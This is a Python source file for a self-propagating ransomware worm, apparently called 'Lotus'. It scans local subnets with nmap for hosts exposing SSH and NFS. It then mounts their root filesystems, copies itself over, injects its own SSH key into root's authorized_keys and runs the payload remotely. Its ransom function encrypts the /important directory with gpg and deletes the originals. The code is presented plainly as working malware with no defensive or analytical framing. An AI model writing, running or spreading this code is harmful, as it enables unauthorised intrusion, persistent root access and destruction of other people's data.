#! /usr/bin/env python3
import os
import nmap
import subprocess
from subprocess import Popen, PIPE
import base64
from os import path
import time
import getpass
ssh_command = "/Lotus/Lotus.py; chmod -R 777 /Lotus; su administrator -c 'export DISPLAY=:0; nohup /Lotus/bluewin.py'; exit; exit"

def subnet():                                                                     
    global h_ip                                                                   
    process = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)              
    stdout = process.communicate()[0]                                             
    stdout = str(stdout.strip())
    stdout = stdout.split(' ')                                                    
    stdout = [i for i in stdout if i]                                             
    elem_list = []                                                                
    t = -1                                                                       
    while True:                                                                   
        try:                                                                      
            t = stdout.index('inet', t + 1)                                       
            elem_list.append(t + 1)
        except ValueError:                                                        
            break
    newelem_list = []                                                             
    for i in elem_list:                                                           
        newelem_list.append(stdout[i])                                            
    newelem_list.remove('127.0.0.1')                                              
    h_ip = newelem_list
    f_list = []                                                                   
    for i in newelem_list:                                                        
        o = i.split('.')                                                          
        o.pop()                                                                   
        f_list.append(str(o[0] + '.' + o[1] + '.' + o[2] + '.' + '1' + '/24'))   
    return(f_list)                                                                

def ssh():
    ssh_list = []
    print('Subnet detection complete, starting scan . . .')                                                                   
    for ip_range in subnet():                                                       
        nm = nmap.PortScanner()                                                     
        nm.scan(ip_range, '22, 111, 2049')                                                         
        for host in nm.all_hosts():                                                 
            if nm[host]['tcp'][22]['state'] == 'open' and nm[host]['tcp'][111]['state'] == 'open' and nm[host]['tcp'][2049]['state'] == 'open':                              
                ssh_list.append(host)                                               
    print('Scan Complete!')
    return(ssh_list)                                                                

def worm():
    try:
        for ip in check():
            print('Starting Worm . . .')
            os.makedirs('/tmp/r00t', exist_ok = True)
            subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
            subprocess.call(['cp', '-r', '/Lotus', '/tmp/r00t'])
            print('Copying complete, attempting ssh')
            subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
            proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
            proc.communicate(input=base64.encodebytes('y'.encode()))
            subprocess.call(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
            time.sleep(5)
            subprocess.run(['umount /tmp/r00t'], shell=True)
            time.sleep(5)
            print('Opening ssh connection. . .')
            subprocess.run(['ssh', '-t', 'root@'  + str(ip), ssh_command])
            print('Complete!')
    except:
        pass

def check():
    if path.exists('/Lotus') == True:
        print('Root File Found')
    elif path.exists('/Lotus') == False:
        print('Root file not found, creating . . .')
        cwd = os.getcwd()
        subprocess.run(['cp', '-r', cwd, '/Lotus'])
    target_list = []                                                                
    for ip in ssh():                                                             
        if ip not in h_ip:
            os.makedirs('/tmp/r00t', exist_ok = True)                                   
            subprocess.run(['mount -t nfs ' + str(ip) +  ':/ /tmp/r00t/'], shell=True)         
            if path.exists('/tmp/r00t/Lotus') != True:                                  
                target_list.append(ip)                                                  
    if len(target_list) == 0:
        print('No Valid Targets!')
    else:
        print('Target(s) validated:' + str(target_list))
        return(target_list)

def ransom():
    if path.exists('/important') == True:
        print('Root Path Found')
        dir1 = "important"
        subprocess.Popen(["gpg --batch --always-trust --passphrase '' --yes --import /Lotus/public.key"], shell=True)
        subprocess.Popen(["gpg --batch --always-trust --passphrase '' --yes --import /Lotus/secret.key"], shell=True)
        subprocess.run(['cd / ; tar czf ' + dir1 + '.tar.gz ' + dir1], shell=True)
        subprocess.run(['cd / ; gpg -e -r encryptor --trust-model always ' + dir1 + '.tar.gz'], shell=True)
        if path.exists('/' + dir1 + '.tar.gz.gpg' ) == True:
            subprocess.run(['rm -r /' + dir1], shell=True)
            subprocess.run(['rm /' + dir1 + '.tar.gz ' ], shell=True)
            print("files encrypted")
        else:
            print("files were not deleted and or encrypted")
        worm()
    else:
        worm()

def main():
    ransom()
if __name__ == '__main__':
    main()











